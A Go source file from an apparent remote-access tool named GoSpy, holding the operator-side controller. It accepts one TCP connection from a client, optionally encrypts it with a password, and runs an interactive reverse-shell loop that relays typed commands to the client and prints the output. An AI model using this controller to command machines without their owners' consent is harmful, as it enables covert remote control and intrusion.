package client

import (
	"bufio"
	"fmt"
	"github.com/psidex/GoSpy/internal/comms"
	"net"
	"os"
	"strings"
)

// GoSpyClient represents a GoSpy client that is connected to this server.
type GoSpyClient struct {
	cm          comms.PacketManager // The manager for the connection to the client.
	password    string              // The password for a secure connection.
	bindAddress string              // The address to listen on for the inbound client connection.
}

// NewGoSpyClient creates instantiates a GoSpyClient.
func NewGoSpyClient(bindAddress string, password string) (client GoSpyClient) {
	return GoSpyClient{bindAddress: bindAddress, password: password}
}

// sendString sends a string to the client.
func (c GoSpyClient) sendString(message string) (err error) {
	return c.cm.SendBytes([]byte(message))
}

// recvString receives a string from the client.
func (c GoSpyClient) recvString() (message string, err error) {
	data, err := c.cm.RecvBytes()
	if err != nil {
		return "", err
	}
	return string(data), nil
}

// CloseConn closes the conn.
func (c GoSpyClient) CloseConn() (err error) {
	return c.cm.Close()
}

// WaitForConn starts a tcp server and waits for a single successful connection.
func (c *GoSpyClient) WaitForConn() (err error) {
	l, err := net.Listen("tcp", c.bindAddress)
	if err != nil {
		return err
	}
	defer l.Close() // Closing the server won't close the already established client connection.

	for {
		conn, err := l.Accept()
		if err == nil {
			if c.password != "" {
				c.cm = comms.NewEncryptedConn(conn, c.password)
			} else {
				c.cm = comms.NewPlainConn(conn)
			}
			return nil
		}
	}
}

// Ping sends a "ping" to the client and waits for a "pong".
func (c GoSpyClient) Ping() (response string, err error) {
	err = c.sendString("ping")
	if err != nil {
		return "", err
	}
	return c.recvString()
}

// EnterReverseShellRepl initiates a REPL with the client.
func (c GoSpyClient) EnterReverseShellRepl() (err error) {
	err = c.sendString("reverse-shell")
	if err != nil {
		return err
	}

	for {
		fmt.Print("\n$ ")

		reader := bufio.NewReader(os.Stdin)
		text, _ := reader.ReadString('\n')
		text = strings.TrimSpace(text)

		err := c.sendString(text)
		if err != nil {
			return err
		}

		// Exit after sending exit to client.
		if text == "exit" {
			return nil
		}

		resp, err := c.recvString()
		if err != nil {
			return err
		}

		fmt.Println(resp)
	}
}
